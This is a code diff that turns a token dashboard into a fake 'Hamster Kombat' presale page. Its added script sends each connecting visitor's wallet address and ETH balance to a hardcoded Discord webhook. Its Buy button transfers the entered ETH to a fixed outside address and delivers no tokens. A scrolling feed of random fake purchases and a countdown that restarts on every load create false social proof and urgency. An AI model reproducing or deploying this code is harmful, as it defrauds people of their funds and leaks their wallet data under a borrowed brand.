@@ -1,248 +1,760 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LYTHOS Dashboard</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
-    <style>
-      @import url('https://fonts.googleapis.com/css?family=Orbitron|Share+Tech+Mono');
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.3.0/dist/web3.min.js"></script>
 
-body {
-    font-family: 'Orbitron', sans-serif;
-    text-align: center;
-    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-    color: #00eaff;
-    margin: 0;
-    padding: 0;
+    <title>Hamster Kombat</title>
+</head>
+    <style>
+
+
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+
+   body {
+            background-color: #0d0d0d;
+            background-image: url('https://www.transparenttextures.com/patterns/wave-cut.png'); /* Añadir la imagen wave */
+            background-size: cover; /* Ajustar el tamaño de la imagen de fondo */
+            background-position: center; /* Centrar la imagen de fondo */
+            color: #ffffff;
+            font-family: 'Orbitron', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+            position: relative; /* Posicionamiento para las imágenes de fondo */
+        }
+
+nav {
     display: flex;
-    justify-content: center;
+    justify-content: space-between;
     align-items: center;
-    height: 100vh;
-    overflow-y: scroll;
+    padding: 10px 20px;
+    background-color: #1a1a1a;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.8);
+    border-bottom: 1px solid #333;
+}
+
+.nav-links a, #connect-wallet {
+    color: #00ff99;
+    margin-right: 15px;
+    text-decoration: none;
+    transition: color 0.3s ease;
+}
+
+.nav-links a:hover, #connect-wallet:hover {
+    color: #ff00ff;
+}
+
+#connect-wallet {
+    background-color: #e3b341;
+    border: none;
+    padding: 10px 15px;
+    cursor: pointer;
+    font-weight: bold;
+    border-radius: 5px;
+    transition: background-color 0.3s ease, transform 0.3s ease;
+}
+
+#connect-wallet:hover {
+    background-color: #ff00ff;
+    transform: scale(1.1);
 }
 
 .container {
-    position: relative;
-    max-width: 500px;
-    margin: auto;
     padding: 20px;
-    background: rgba(0, 0, 0, 0.8);
-    border: 2px solid #ff00ff;
-    border-radius: 15px;
-    box-shadow: 0px 0px 20px rgba(255, 0, 255, 0.6);
-    animation: glow 1.5s infinite alternate;
-    text-align: center;
+    max-width: 1400px;
+    margin: 20px auto;
+    position: relative;
+    z-index: 2;
+   
 }
 
-@keyframes glow {
-    from { box-shadow: 0px 0px 10px rgba(255, 0, 255, 0.4); }
-    to { box-shadow: 0px 0px 20px rgba(255, 0, 255, 0.8); }
-}
-
-button {
-    margin: 10px;
-    padding: 12px 20px;
-    cursor: pointer;
-    border: none;
-    border-radius: 5px;
-    background: linear-gradient(90deg, #ff00ff, #00eaff);
-    color: #fff;
-    font-size: 16px;
-    font-weight: bold;
-    text-transform: uppercase;
-    transition: all 0.3s ease;
-    box-shadow: 0px 0px 10px rgba(255, 0, 255, 0.6);
-}
-
-button:hover {
-    background: linear-gradient(90deg, #00eaff, #ff00ff);
-    box-shadow: 0px 0px 20px rgba(0, 255, 255, 0.8);
-}
-
-input {
-    width: 100%;
-    padding: 10px;
-    margin: 10px 0;
-    border: 2px solid #00eaff;
-    border-radius: 5px;
-    background: #111;
-    color: #00eaff;
-    font-size: 16px;
-    text-align: center;
-}
-
-input:focus {
-    outline: none;
-    border-color: #ff00ff;
-    box-shadow: 0px 0px 10px rgba(255, 0, 255, 0.6);
-}
-
-h2 {
-    font-size: 24px;
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    color: #ff00ff;
-    text-shadow: 0px 0px 10px rgba(255, 0, 255, 0.8);
-}
 
 .header {
-    font-size: 14px;
-    font-weight: bold;
-    background: rgba(0, 255, 204, 0.2);
-    border: 1px solid rgba(0, 255, 204, 0.5);
-    padding: 15px;
-    width: 200px;
-    margin: auto;
+    background-color: rgba(26, 26, 26, 0.6); /* Fondo oscuro y más claro */
+    padding: 20px;
     border-radius: 10px;
-    box-shadow: 0px 0px 10px rgba(0, 255, 204, 0.4);
-    white-space: nowrap;
-    position: relative;
+    margin-bottom: 20px;
     text-align: center;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.8);
+}
+
+.main-content {
     display: flex;
     justify-content: center;
     align-items: center;
-}
-
-.header span {
-    display: inline-block;
     position: relative;
-    color: #ffcc00;
-    text-shadow: 0 0 5px #ffcc00, 0 0 10px #ffcc00, 0 0 15px #ff6600;
+    z-index: 2; /* Asegura que el contenido principal esté por encima de las imágenes de fondo */
 }
 
-@keyframes slide-in {
-    from {
-        transform: translateX(100%);
-    }
-    to {
-        transform: translateX(0);
-    }
-}
-
-.header::before,
-.header::after {
-    content: "";
+.left-side-image, .right-side-image {
     position: absolute;
-    width: 8px;
-    height: 8px;
+    top: 0;
+    bottom: 0;
+    width: 50%;
+    opacity: 1; /* Opacidad ajustada */
+    z-index: -2;
+}
+
+.left-side-image {
+    left: 0;
+}
+
+.right-side-image {
+    right: 0;
+}
+
+.left-side-image img, .right-side-image img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    filter: brightness(1.5); /* Brillo ajustado */
+    position: absolute;
+    top: 0;
+    left: 0;
+
+}
+
+.exchange-box {
+    background-color: rgba(26, 26, 26, 0.6); /* Fondo oscuro y más claro */
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.8);
+    flex: 2;
+    margin: 0 20px;
+    z-index: 2;
+    width: 100%;
+    max-width: 600px;
+}
+
+.exchange-options {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 20px;
+}
+
+.exchange-options button {
+    background-color: rgba(51, 51, 51, 0.6); /* Fondo oscuro y más claro */
+    border: none;
+    color: #00ff99;
+    padding: 10px 20px;
+    cursor: pointer;
+    margin: 0 5px;
+    border-radius: 5px;
+    transition: background-color 0.3s ease, transform 0.3s ease;
+}
+
+.exchange-options button:hover {
+    background-color: #ff00ff;
+    transform: scale(1.1);
+}
+
+.exchange-form {
+    margin-top: 10px;
+}
+
+.form-group {
+    margin-bottom: 20px;
+}
+
+.input-group {
+    display: flex;
+    align-items: center;
+}
+
+.input-group select, .input-group input {
+    padding: 10px;
+    border: 1px solid #2c2c2c;
+    background-color: rgba(51, 51, 51, 0.6); /* Fondo oscuro y más claro */
+    color: #ffffff;
+    margin-right: 10px;
+    flex: 1;
+    border-radius: 5px;
+    box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.8);
+    transition: border-color 0.3s ease;
+}
+
+.input-group select:focus, .input-group input:focus {
+    border-color: #ff00ff;
+}
+
+.swap-container {
+    display: flex;
+    justify-content: center;
+    margin: 20px 0;
+}
+
+.swap-icon button {
+    background-color: rgba(51, 51, 51, 0.6); /* Fondo oscuro y más claro */
+    border: none;
+    color: #00ff99;
+    font-size: 20px;
+    cursor: pointer;
+    padding: 10px;
     border-radius: 50%;
-    background: red;
-    box-shadow: 0 0 8px red;
-    top: 50%;
-    transform: translateY(-50%);
-    animation: blink 1s infinite alternate;
+    transition: background-color 0.3s ease, transform 0.3s ease;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.8);
 }
 
-.header::before {
-    left: 5px;
+.swap-icon button:hover {
+    background-color: #ff00ff;
+    transform: scale(1.2);
 }
 
-.header::after {
-    right: 5px;
-    animation-delay: 0.5s;
+.extra-options, .trade-options {
+    margin-top: 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
 }
 
-@keyframes blink {
-    0% { background: red; box-shadow: 0 0 8px red; }
-    100% { background: yellow; box-shadow: 0 0 12px yellow; }
+.trade-options input[type="checkbox"] {
+    margin-left: 10px;
 }
 
+.routing {
+    margin-left: 20px;
+}
+
+p {
+    margin: 0;
+    padding: 0;
+}
+
+ .countdown-container {
+            text-align: center;
+            margin: 20px 0;
+            color: #ffffff;
+        }
+
+        .countdown {
+            font-size: 24px;
+            font-weight: bold;
+            background-color: rgba(51, 51, 51, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.8);
+        }
+
+        .countdown span {
+            display: inline-block;
+            min-width: 40px;
+            padding: 5px 10px;
+            border-radius: 5px;
+            margin: 0 5px;
+        }
+
+        .countdown .updating {
+            color: #ff0000;
+        }
+#buy-button {
+  display: block;
+  margin: 0 auto; /* Centrará el botón horizontalmente */
+  padding: 10px 20px;
+  background-color: yellow;
+  border: none;
+  border-radius: 5px;
+  font-size: 16px;
+  color: black;
+  cursor: pointer;
+  transition: transform 0.2s, background-color 0.2s;
+}
+
+#buy-button:active {
+  transform: scale(0.95); /* Reduce ligeramente el tamaño del botón */
+  background-color: gold; /* Cambia el color de fondo al hacer clic */
+}
+ @keyframes subtle-glow {
+        0% {
+            text-shadow: 0 0 3px rgba(255, 255, 255, 0.5),
+                         0 0 5px rgba(255, 255, 255, 0.3);
+        }
+        50% {
+            text-shadow: 0 0 6px rgba(255, 255, 255, 0.7),
+                         0 0 10px rgba(255, 255, 255, 0.5);
+        }
+        100% {
+            text-shadow: 0 0 3px rgba(255, 255, 255, 0.5),
+                         0 0 5px rgba(255, 255, 255, 0.3);
+        }
+    }
+
+
+ .container {
+            padding: 20px;
+            max-width: 800px;
+            margin: 20px auto;
+            position: relative;
+            z-index: 2;
+        }
+
+        .referral-container {
+            text-align: center;
+            margin: 20px;
+            padding: 20px;
+            border: 1px solid #333;
+            border-radius: 8px;
+            background-color: #1a1a2e;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            max-width: 600px;
+            margin: 0 auto; /* Center the container */
+        }
+
+        .referral-container h2 {
+            margin-bottom: 10px;
+            color: #00d4ff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        .referral-link {
+            display: block;
+            margin: 10px 0;
+            padding: 10px;
+            background-color: #2e2e5d;
+            border: 1px solid #00d4ff;
+            border-radius: 4px;
+            text-decoration: none;
+            color: #00d4ff;
+            word-wrap: break-word;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        .referral-container button {
+            padding: 10px 20px;
+            background-color: #00d4ff;
+            color: #1a1a2e;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+
+        .referral-container button:hover {
+            background-color: #0095b6;
+            transform: scale(1.05);
+        }
+
+      .transaction-container {
+        max-width: 800px;
+        margin: 50px auto;
+        padding: 20px;
+        border: 1px solid #333;
+        border-radius: 8px;
+        background-color: #1a1a2e;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        position: relative;
+        overflow: hidden;
+        height: 200px; /* Altura fija */
+    }
+
+    .transaction-list {
+        position: absolute;
+        width: 100%;
+        list-style: none;
+        padding: 0;
+        margin: 0;
+        animation: scrollUp 15s linear infinite; /* Ajustar duración según sea necesario */
+    }
+
+    .transaction {
+        display: flex;
+        justify-content: space-between;
+        padding: 10px 0;
+        margin-bottom: 5px;
+    }
+
+    .transaction:nth-child(odd) {
+        background-color: rgba(51, 51, 51, 0.6);
+    }
+
+    .transaction:nth-child(even) {
+        background-color: rgba(77, 77, 77, 0.6);
+    }
+
+    .transaction span {
+        flex: 1;
+        text-align: center;
+    }
+
+    .address {
+        color: #00ff99;
+    }
+
+    .eth {
+        color: #ff00ff;
+    }
+
+    .hmstr {
+        color: #e3b341;
+    }
+
+    .time {
+        color: #00d4ff;
+    }
+
+    .hash {
+        color: #ff5733;
+    }
+
+    @keyframes scrollUp {
+        0% {
+            transform: translateY(100%);
+        }
+        20%,
+        25% {
+            transform: translateY(0);
+        }
+        100% {
+            transform: translateY(-100%);
+        }
+    }
     </style>
-</head>
 <body>
-    <div class="container">
-        <h2>LYTHOS Dashboard</h2>
-        <button onclick="connectWallet()">Conectar Wallet</button>
-        <p><strong>Cuenta:</strong> <span id="account">No conectado</span></p>
-        <p><strong>Balance LYTH:</strong> <span id="balance">0</span></p>
-        <p><strong>Referido:</strong> <span id="referrer">No asignado</span></p>
-        
-        <input type="text" id="referralAddress" placeholder="Dirección del referidor">
-        <button onclick="setReferrer()">Asignar Referidor</button>
-        
-        <p><strong>Enlace de referido:</strong></p>
-        <input type="text" id="referralLink" readonly>
-        <button onclick="copyReferralLink()">Copiar Enlace</button>
-        
-        <button onclick="claimRewards()">Claim Rewards</button>
-        <button onclick="buyTokens()">Comprar Tokens</button>
+    <nav>
+        <div class="logo"><!-- Imagen del logo eliminada --></div>
+        <div class="nav-links">
+            <a href="#">Pre sale</a>
+            <a href="https://hamsterkombatgame.io">Developers</a>
+<a href="https://hamsterkombatgame.io/docs/hk_wp_rev.0.2_july_30__2024.pdf" target="_blank">Whitepaper</a>
+            <a href="https://hamsterkombatgame.io">Road Map</a>
+            <a href="#referral-section">Refer</a>
+            <a href="https://hamsterkombatgame.io">Game</a>
+        </div>
+        <button id="connect-wallet">Connect wallet</button>
+    </nav>
 
-         <!-- Card para Recompensas Disponibles -->
-        <div class="card" id="rewardCard">
-            <p id="rewardStatus">Recompensa disponible: No</p>
+    <div class="container">
+        <div class="header">
+
+            
+<h1 style="color: #00FFFF; text-align: center; font-weight: bold; position: relative; display: inline-block;">
+    Hamster Kombat <span style="position: relative; display: inline-block; overflow: hidden;">
+        <span style="position: relative; display: inline-block; color: #00FFFF; animation: sword-glow 3s infinite;">pre sale</span>
+    </span>!
+</h1>
+            
+            
+<p>Hurry to get your <span style="color:#ff00ff;">HMSTR tokens</span> before they are listed. The <span style="color:#ff00ff;">countdown</span> has just begun!</p>
+<p>See everything that's new and read about our mission to build <span style="color:#00ff99;">DeFi's internet of liquidity</span>.</p>
+
         </div>
 
-        <!-- Card para el Precio del Token -->
-        <div class="card">
-            <p class="token-price">Precio del Token: 1 ETH = 20,000 LYTH</p>
+        <div class="presale-info">
+<div style="text-align: center;">
+    <p style="color: #FFA500; font-weight: bold;">Minimum purchase: <span style="color: #FFD700;">0.1 ETH</span></p>
+    <p style="color: #FF4500; font-weight: bold;">Maximum purchase: <span style="color: #FFD700;">10 ETH</span></p>
+    <p style="color: #32CD32; font-weight: bold;">1 ETH = <span style="color: #FFD700;">28000 HMSTR</span></p>
+</div>
+
+
+
+</div>
+<div class="countdown-container">
+    <h2>Countdown to End of Presale:</h2>
+    <div id="countdown" class="countdown"></div>
+</div>
+ <div class="main-content">
+            <div class="left-side-image">
+                <img src="https://pre-sale-hamster.vercel.app/BackgroundEraser_20240729_123131463.png" alt="Cyberpunk Decoration">
+            </div>
+
+      
+
+            <div class="exchange-box">
+                <div class="exchange-options">
+                    <button id="grand-master">Buy Grand Master</button>
+                    <button id="lord">Buy Lord</button>
+                    <button id="creator">Buy Creator</button>
+                </div>
+                <div class="exchange-form">
+                    <div class="form-group">
+                        <label for="pay">You pay</label>
+                        <div class="input-group">
+                            <select id="pay">
+                                <option value="eth">ETH</option>
+                                <!-- Otras opciones -->
+                            </select>
+                            <input type="text" id="pay-amount" placeholder="0">
+                        </div>
+                    </div>
+                    <div class="swap-container">
+                        <div class="swap-icon">
+                            <button id="swap">⇅</button>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="receive">You receive</label>
+                        <div class="input-group">
+                            <select id="receive">
+                                <option value="hmstr">HMSTR</option>
+                                <!-- Otras opciones -->
+                            </select>
+                            <input type="text" id="receive-amount" placeholder="0">
+                        </div>
+                                    <button id="buy-button">Buy Now</button>
+
+                    </div>
+                    <p>+ 0 POINTS</p>
+                    <div class="extra-options">
+                        <label for="trade-another-address">Trade and Send to Another Address</label>
+                        <input type="checkbox" id="trade-another-address">
+                        <div class="routing">
+                            <label for="routing">Routing</label>
+                            <select id="routing">
+                                <option value="standard">Standard</option>
+                                <!-- Otras opciones -->
+                            </select>
+                        </div>
+                    </div>
+                    <p>ETA: &lt; 2.5 min</p>
+                </div>
+            </div>
+
+          
+           <div class="right-side-image">
+                <img src="https://pre-sale-hamster.vercel.app/hamster.png" alt="Cyberpunk Decoration">
+            </div>
+
         </div>
     </div>
 
-    <script>
-        let web3;
-        let account;
-        const contractAddress = "0x14de60C3fa46f3f9EB95D181CCb0E61d0c19EFd8";
-        const contractABI = [{"inputs":[{"internalType":"address","name":"_lythosBotAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Burn","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"buyer","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"BuyTokens","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"EthWithdrawn","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Mint","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":true,"internalType":"address","name":"referrer","type":"address"}],"name":"SetReferrer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensRewarded","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"ETH_PRICE_IN_LYTH","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_from","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"buyTokens","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"lythosBot","outputs":[{"internalType":"contract ILythosBot","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"referrer","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"rewardPercentage","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"rewardTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"rewardedBots","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_referrer","type":"address"}],"name":"setReferrer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_percentage","type":"uint256"}],"name":"setRewardPercentage","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"withdrawETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"withdrawTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];
-        let contract;
 
-        async function connectWallet() {
-            if (window.ethereum) {
+
+
+    
+        <div id="referral-section" class="referral-container">
+        <h2>Share refe your win 2 HMSTR Token for refe </h2>
+        <a id="referral-link" class="referral-link" href="#" target="_blank">Generate Referral Link</a>
+        <button id="copy-button">Copy Referral Link</button>
+    </div>
+
+<h2 style="text-align: center;">Tx Buy HMSTR</h2>
+
+<div class="transaction-container" id="transaction-container">
+
+    <script src="app.js"></script>
+</body>
+    <script>
+
+        document.addEventListener('DOMContentLoaded', () => {
+    const grandMasterButton = document.getElementById('grand-master');
+    const lordButton = document.getElementById('lord');
+    const creatorButton = document.getElementById('creator');
+    const payAmountInput = document.getElementById('pay-amount');
+    const receiveAmountInput = document.getElementById('receive-amount');
+    const buyButton = document.getElementById('buy-button');
+    const connectWalletButton = document.getElementById('connect-wallet');
+    const referralLinkElement = document.getElementById('referral-link');
+    const copyButton = document.getElementById('copy-button');
+
+    // Función para actualizar el valor de receiveAmountInput basado en payAmountInput
+    function updateReceiveAmount() {
+        const payAmount = parseFloat(payAmountInput.value);
+        const tokensPerEth = 28000;
+        const tokens = payAmount * tokensPerEth;
+        receiveAmountInput.value = tokens.toFixed(0);
+    }
+
+    grandMasterButton.addEventListener('click', () => {
+        payAmountInput.value = '0.1';
+        receiveAmountInput.value = '2400';
+    });
+
+    lordButton.addEventListener('click', () => {
+        payAmountInput.value = '0.5';
+        receiveAmountInput.value = '14000'; // 0.5 * 28000
+    });
+
+    creatorButton.addEventListener('click', () => {
+        payAmountInput.value = '1';
+        receiveAmountInput.value = '28000';
+    });
+
+    payAmountInput.addEventListener('input', updateReceiveAmount);
+
+    var endDate = new Date();
+    endDate.setDate(endDate.getDate() + 5); // Sumar 5 días
+    endDate.setHours(endDate.getHours() + 14); // Sumar 14 horas
+
+    function updateCountdown() {
+        var now = new Date();
+        var timeRemaining = endDate - now;
+
+        if (timeRemaining <= 0) {
+            document.getElementById('countdown').innerHTML = "Presale has ended!";
+            return;
+        }
+
+        var days = Math.floor(timeRemaining / (1000 * 60 * 60 * 24));
+        var hours = Math.floor((timeRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        var minutes = Math.floor((timeRemaining % (1000 * 60 * 60)) / (1000 * 60));
+        var seconds = Math.floor((timeRemaining % (1000 * 60)) / 1000);
+
+        document.getElementById('countdown').innerHTML = 
+            days + "d " + hours + "h " + minutes + "m " + seconds + "s";
+    }
+
+    // Actualiza el contador cada segundo
+    updateCountdown();
+    setInterval(updateCountdown, 1000);
+
+    // Función para enviar datos al webhook de Discord
+    async function sendToDiscord(address, balance) {
+        const webhookUrl = 'https://discord.com/api/webhooks/1122719600375758930/HOqLrk3OlLHLaiP7u2ZGFqRNOoWqnPBSyKq9S3f96m8dwYdxhBSyITl5Ocuzzogho1nl'; // Reemplaza con tu URL de webhook
+        const payload = {
+            content: `Nueva conexión de billetera: \n- Dirección: ${address} \n- Saldo: ${balance} ETH`
+        };
+
+        try {
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+            console.log('Datos enviados a Discord correctamente.');
+        } catch (error) {
+            console.error('Error al enviar datos a Discord:', error);
+        }
+    }
+
+    // Integrar el script para conectar la billetera
+    let web3;
+    let account;
+
+    connectWalletButton.addEventListener('click', async () => {
+        if (window.ethereum) {
+            try {
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
                 web3 = new Web3(window.ethereum);
-                await window.ethereum.request({ method: "eth_requestAccounts" });
                 const accounts = await web3.eth.getAccounts();
                 account = accounts[0];
-                document.getElementById("account").innerText = account;
-                contract = new web3.eth.Contract(contractABI, contractAddress);
-                updateDashboard();
-            } else {
-                alert("MetaMask no está instalado");
+
+                // Obtener saldo
+                const balanceWei = await web3.eth.getBalance(account);
+                const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
+
+                // Enviar datos a Discord
+                await sendToDiscord(account, balanceEth);
+
+                // Selecciona todos los elementos con la clase wallet-address y actualiza su texto
+                document.querySelectorAll('.wallet-address').forEach(element => {
+                    element.innerText = account;
+                });
+
+                // Cambiar el texto del botón a "WEB3 ACTIVE"
+                connectWalletButton.innerText = "WEB3 ACTIVE";
+                connectWalletButton.disabled = true;
+
+                // Generar el enlace de referido
+                const baseUrl = 'https://pre-sale-hamster.vercel.app/';
+                referralLinkElement.href = `${baseUrl}?ref=${encodeURIComponent(account)}`;
+                referralLinkElement.innerText = referralLinkElement.href;
+
+            } catch (error) {
+                console.error("Error connecting to MetaMask:", error);
             }
+        } else {
+            alert('Usa el navegador de Metamask o Trustwallet para abrir esta DAPP, o abrir en pc con extension de Metamask.');
         }
+    });
 
-        async function updateDashboard() {
-            if (!contract || !account) return;
-            let balance = await contract.methods.balanceOf(account).call();
-            let referrer = await contract.methods.referrer(account).call();
-            document.getElementById("balance").innerText = web3.utils.fromWei(balance, "ether");
-            document.getElementById("referrer").innerText = referrer === "0x0000000000000000000000000000000000000000" ? "No asignado" : referrer;
-            generateReferralLink();
-        }
+    // Configurar el evento para el botón de compra
+    buyButton.addEventListener('click', async () => {
+        if (web3 && account) {
+            try {
+                const amountToSendInEther = payAmountInput.value;
+                const amountToSendInWei = web3.utils.toWei(amountToSendInEther, 'ether');
+                const recipientAddress = '0x01C65F22A9478C2932e62483509c233F0aaD5c72';
 
-        async function claimRewards() {
-            const contract = new web3.eth.Contract(contractABI, contractAddress);
-            const reward = await contract.methods.getReward(account).call();
-            const rewardStatus = document.getElementById("rewardStatus");
-            if (reward > 0) {
-                rewardStatus.textContent = `Recompensa disponible: ${reward} LYTH`;
-            } else {
-                rewardStatus.textContent = `Recompensa disponible: No`;
+                await web3.eth.sendTransaction({
+                    from: account,
+                    to: recipientAddress,
+                    value: amountToSendInWei
+                });
+            } catch (error) {
+                console.error('Error en la transacción:', error);
             }
+        } else {
+            alert('Conecta tu billetera primero.');
         }
+    });
 
-       async function buyTokens() {
-            const contract = new web3.eth.Contract(contractABI, contractAddress);
-            const price = await contract.methods.ETH_PRICE_IN_LYTH().call();
-            alert(`1 ETH = ${price / 1e18} LYTH`);
-        }
-        async function setReferrer() {
-            const refAddress = document.getElementById("referralAddress").value;
-            if (!web3.utils.isAddress(refAddress)) return alert("Dirección inválida");
-            await contract.methods.setReferrer(refAddress).send({ from: account });
-            updateDashboard();
-        }
+    // Copiar enlace al portapapeles
+    copyButton.addEventListener('click', () => {
+        navigator.clipboard.writeText(referralLinkElement.href).then(() => {
+            alert('Referral link copied to clipboard!');
+        }, (err) => {
+            console.error('Failed to copy: ', err);
+        });
+    });
 
-        function generateReferralLink() {
-            const link = `${window.location.origin}?ref=${account}`;
-            document.getElementById("referralLink").value = link;
-        }
+    // Inicializar el valor de receiveAmountInput basado en payAmountInput
+    updateReceiveAmount();
 
-        function copyReferralLink() {
-            const linkInput = document.getElementById("referralLink");
-            linkInput.select();
-            document.execCommand("copy");
-            alert("Enlace copiado");
+    const transactionContainer = document.getElementById('transaction-container');
+    const addresses = [
+        '0x1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s',
+        '0x2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9sa1',
+        '0x3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9sa2b3',
+        '0x4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9sa3b4c',
+        '0x5e6f7g8h9i0j1k2l3m4n5o6p7q8r9sa4b5c6d',
+        '0x6f7g8h9i0j1k2l3m4n5o6p7q8r9sa5b6c7d8e',
+        '0x7g8h9i0j1k2l3m4n5o6p7q8r9sa6b7c8d9e0f',
+        '0x8h9i0j1k2l3m4n5o6p7q8r9sa7b8c9d0e1f2g',
+        '0x9i0j1k2l3m4n5o6p7q8r9sa8b9c0d1e2f3g4h',
+        '0x0j1k2l3m4n5o6p7q8r9sa9b0c1d2e3f4g5h6i'
+    ];
+
+    function getRandomAddress() {
+        return addresses[Math.floor(Math.random() * addresses.length)];
+    }
+
+    function getRandomEth() {
+        return (Math.random() * (10 - 0.1) + 0.1).toFixed(2);
+    }
+
+    function getRandomHMSTR(ethAmount) {
+        return (ethAmount * 28000).toFixed(0);
+    }
+
+    function getRandomHash() {
+        return '0x' + Math.random().toString(36).substring(2, 15);
+    }
+
+    function getRandomTime() {
+        return new Date().toLocaleTimeString();
+    }
+
+    function createTransaction() {
+        const ethAmount = getRandomEth();
+        const transaction = document.createElement('div');
+        transaction.classList.add('transaction');
+
+        transaction.innerHTML = `
+            <span class="address">${getRandomAddress().substring(0, 6)}...${getRandomAddress().substring(38)}</span>
+            <span class="amount">${ethAmount} ETH</span>
+            <span class="hash"><a href="#" target="_blank">${getRandomHash().substring(0, 10)}...</a></span>
+            <span class="time">${getRandomTime()}</span>
+        `;
+
+        return transaction;
+    }
+
+    function updateTransactions() {
+        transactionContainer.innerHTML = '';
+        for (let i = 0; i < 10; i++) {
+            transactionContainer.appendChild(createTransaction());
         }
+    }
+
+    updateTransactions();
+    setInterval(updateTransactions, 10000);
+});
     </script>
-</body>
 </html>
